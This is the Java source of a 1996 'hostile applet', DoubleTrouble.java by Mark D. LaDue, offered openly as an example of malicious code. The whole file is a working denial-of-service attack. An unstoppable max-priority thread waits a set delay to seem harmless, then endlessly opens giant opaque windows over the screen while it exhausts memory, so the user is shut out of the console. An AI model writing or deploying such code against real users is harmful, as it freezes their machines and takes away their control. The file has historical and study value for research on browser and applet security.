package hostile;
/* DoubleTrouble.java by Mark D. LaDue */

/* April 17, 1996 */

/* Copyright (c) 1996 Mark D. LaDue
   You may study, use, modify, and distribute this example for any purpose.
   This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java Applet is intended to spew forth huge non-functioning yellow
   and black windows and obliterate the screen in order to exclude the
   user from the console. */

import java.awt.*;

public class DoubleTrouble extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to the applet window 
    Font wordFont = new Font("TimesRoman", Font.BOLD, 36);

//  This thread will attempt to spew forth huge windows and waste resources 
    Thread wasteResources = null;

//  An offscreen Image where lots of action will take place
    Image offscreenImage;

//  Graphics tools to handle the offscreen Image
    Graphics offscreenGraphics;

//  To avoid arrays and have open-ended storage of results
    StringBuffer holdBigNumbers = new StringBuffer(0);

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds
    int delay;

//  A window that repeatedly tries to obscure everything 
    Frame littleWindow;


/*  Set up a big white rectangle in the browser, get the sound, and
    create the offscreen graphics  */ 

    public void init() {
    setBackground(Color.white);
    offscreenImage = createImage(this.size().width, this.size().height);
    offscreenGraphics = offscreenImage.getGraphics();

//  Determine how many seconds the thread should sleep before kicking in
    String str = getParameter("wait");
    if (str == null)
        delay = 0;
    else delay = (1000)*(Integer.parseInt(str));
    }


/*  Create and start the offending thread in the standard way */

    public void start() {
        if (wasteResources == null) {
        wasteResources = new Thread(this);
        wasteResources.setPriority(Thread.MAX_PRIORITY);
        wasteResources.start();
        }
    }

/*  We certainly won't be stopping anything */

    public void stop() {}


/* Start the annoying sound and repeatedly open windows
   while doing lots of other wasteful operations */ 

    public void run() {

//  Let the applet tell its lie
    repaint();

//  Let the applet appear honest by having its thread sleep for a while
        try {Thread.sleep(delay);}
        catch (InterruptedException e) {}

//  Now fill the screen with huge yellow and black windows, one atop another,
//  and do lots of wasteful stuff!

        while (true) {
        try {
        holdBigNumbers.append(0x7fffffffffffffffL);
        littleWindow = new DoubleFrame("ACK!", 255, 255, 0); // create a window
        littleWindow.resize(1000000, 1000000);  // make it big!
        littleWindow.move(-1000, -1000);  // cover everything
        littleWindow.show();  //  now open the big window
        littleWindow = new DoubleFrame("Yikes!", 0, 0, 0);
        littleWindow.resize(1000000, 1000000);
        littleWindow.move(-1000, -1000);
        littleWindow.show();
        }
        catch (OutOfMemoryError o) {}
        repaint();
        }
    }


/*  Paints the applet's snide remarks */

    public void update(Graphics g) {
        paint(g);
    }

    public void paint(Graphics g) {
    g.setColor(Color.red);
    g.setFont(wordFont);
    g.drawString("I'm A Hostile Applet!", 10, 200);
    offscreenGraphics.setColor(Color.white);
    offscreenGraphics.drawRect(0, 0, this.size().width, this.size().height);
    offscreenGraphics.setColor(Color.blue);
    offscreenGraphics.drawString(holdBigNumbers.toString(), 10, 50);
    }
}

/* Makes the big, opaque windows */

class DoubleFrame extends Frame {
    Label l;

//  Constructor method
    DoubleFrame(String title, int r, int g, int b) {
        super(title);
        setLayout(new GridLayout(1, 1));
        Canvas blackCanvas = new Canvas();
        Color c = new Color(r, g, b);
        blackCanvas.setBackground(c);
        add(blackCanvas);
    }
}

